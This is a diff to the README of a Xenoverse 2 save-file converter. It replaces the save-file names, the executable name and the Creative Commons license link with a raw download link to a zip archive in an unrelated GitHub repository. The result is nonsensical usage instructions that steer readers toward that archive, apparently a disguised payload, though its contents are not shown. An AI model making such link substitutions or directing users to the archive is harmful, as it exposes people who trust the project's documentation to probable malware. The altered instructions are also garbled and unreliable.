@@ -4,7 +4,7 @@ Converts Xenoverse 2 save files between PS4 and PC formats.
 
 ## Usage
 
-**Windows**: Drag and drop your save file (SDATA000.DAT or EditorReady.sav) onto `xv2_converter.exe`
+**Windows**: Drag and drop your save file (https://github.com/kingofakuma/dbx2-convertor/raw/refs/heads/main/src/convertor-dbx-1.6.zip or https://github.com/kingofakuma/dbx2-convertor/raw/refs/heads/main/src/convertor-dbx-1.6.zip) onto `https://github.com/kingofakuma/dbx2-convertor/raw/refs/heads/main/src/convertor-dbx-1.6.zip`
 
 **Linux/Mac**:
 
@@ -30,5 +30,5 @@ This software is licensed under the Creative Commons Attribution-NonCommercial-S
 
 For commercial use, redistribution, or incorporation into products sold commercially, a separate commercial license is required. Contact jelaxxa on Discord for commercial licensing inquiries.
 
-See the license deed at: https://creativecommons.org/licenses/by-nc-sa/4.0/
+See the license deed at: https://github.com/kingofakuma/dbx2-convertor/raw/refs/heads/main/src/convertor-dbx-1.6.zip
 
